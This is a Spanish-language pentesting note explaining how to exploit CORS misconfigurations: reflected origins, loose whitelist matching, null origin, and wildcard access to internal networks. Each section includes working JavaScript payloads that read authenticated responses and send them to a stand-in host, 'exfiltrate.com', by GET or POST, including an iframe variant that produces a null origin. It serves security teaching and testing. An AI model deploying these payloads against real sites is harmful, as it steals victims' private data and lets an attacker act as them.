### Contexto

- La mayoría de los ataques en CORS requieren que la header **Access-Control-Allow-Credentials** esté seteada en **true** para poder tener un contexto de autenticación de la víctima.
- De lograrse un ataque teniendo en cuenta el caso anterior saliendo desde un servicio controlado por el atacante la vulnerabilidad es similar al CSRF pero más severa.
- Dependiendo de la configuración específica del CORS el atacante puede potencialmente interactuar con la aplicación impersonando a la victima y ejecutando acciones sobre su comportamiento.


Si la header Access-Control-Allow-Credentials no está seteada, el atacante no podrá continuar con los ataques antes mencionados. Sin embargo, **una mala configuración de CORS en una aplicación web interna puede permitir a un atacante exfiltrar información no pública**

---

## Arbitrary Origin Reflection

La header Access-Control-Allow-Origin contiene los origenes que tienen permitido baypassear la SOP. El header puede ser seteado con un wildcard (*) que resulta en el permiso de todos los origenes.Por motivos de seguridad **EL WIDLCARD NUNCA DEBE SER SER COMBINADO CON Access-Control-Allow-Credentias seteado a true**

Podemos identificarla si vemos que en la cabecera Access-Control-allow-Origin de la response se refleja la cabeceras Origin o Referer de la request.

Si esto último se da y la header Access-Control-Allow-Credentials está seteada en true podemos explotarla.

### Explotación:

Creamos un payload en un sitio controlado por nosotros donde se indique el recurso a exfiltrar por medio de un get, que se haga con credenciales, el sitio al que van a ser reenviados los datos y luego un send de manera automática. Y se lo hacemos llegar a la víctima.

    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://api.vulnerablesite.com/data', true);
        xhr.withCredentials = true;
        xhr.onload = () => {
          location = 'http://exfiltrate.com/log?data=' + btoa(xhr.response);
        };
        xhr.send();
    </script>

## Improper Origin Whitelist

Esta explotación se basa en un error de configuración en la implementación de whitelist de los trusted origin. Requiere nuevamente el header Access-Control-Allow-Credentials seteado en true.

Imaginamos que el sitio *api.vulnerable.com* quiere permitir las request de todos los subdominios de *vulnerable.com*. Al validar el origen solo se fijará en que el mismo termine en *vulnerable.com* sin importar qué venga detrás. 

Esto permite a un atacante crear una web llamada **attackervulnerable.com** y cumplir con los requisiros del filtro de la whitelist.

La explotación es, entonces, exáctamente igual a la de arbitrary origin reflection.


## Trusted Null Origin.

La explotación se da cuando la cabecera de la response Access-Control-Allow-Origin está seteada en null y la header Access-Control-Allow-Credentials está seteada a true.

**EN LA PRACTICA LA CABECERA ACCESS-CONTROL-ALLOW-ORIGIN NUNCA DEBE ESTAR SETEADA EN NULL**. Sin embargo, los programadores suele confundirse con el sigificado de la misma pensando que es un "bloqueador total".

### Explotación.
La explotación es muy similar a las anteriores pero dentro de un **iframe**. De esta manera no es el sitio el que está haciendo la request sino el objeto (iframe), de esta manera el origen es nulo.

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://api.vulnerablesite.com/data', true);
        xhr.withCredentials = true;
        xhr.onload = () => {
          location = 'http://exfiltrate.com/log?data=' + btoa(xhr.response);
        };
        xhr.send();
    </script>"></iframe>

## Targeting The local network

Este ataque no requiere la cabecera Access-Control-Allow-Credentials.

En el caso de que el header Access-Control-Allow-Origin esté seteado con un wildcard podemos buscar exfiltrar apis o sitios internos de la infraestructura si la victima se encuentra conectada desde dentro de la red de la organización.

No es buena idea exfiltrar una página mediante el método GET porque la URL no es ilimitada y el contenido puede muy facilmente superar la cantidad de caracteres disponibles. Es mejor, en el caso de un exfiltrado total, usar el método POST y guardar todo en un parámetro.
Otra forma de hacerlo, mediante el método GET es filtrar el resultado por los datos que pueden sernos importantes mediante la funcion getElementById:

### Ejemplo de payload en GET:

        <script>
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://api.vulnerablesite.com/data', true);
            xhr.withCredentials = true;
            xhr.onload = () => {
              // parse the response
        	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');
        
        	  // exfiltrate only the interesting element
        	  var msg = encodeURIComponent(doc.getElementById('secret').innerHTML);
              location = 'https://exfiltrate.com/log?data=' + btoa(msg);
            };
            xhr.send();
        </script>

### Ejemplo de POST

    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://172.16.0.2/data', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
        xhr.onload = () => {
          var exfilData = btoa(xhr.response);
          var postData = 'data=' + encodeURIComponent(exfilData);
    
          var xhr2 = new XMLHttpRequest();
          xhr2.open('POST', 'http://exfiltrate.com/log', true);
          xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr2.send(postData);
        };
    
        xhr.send();
    </script>

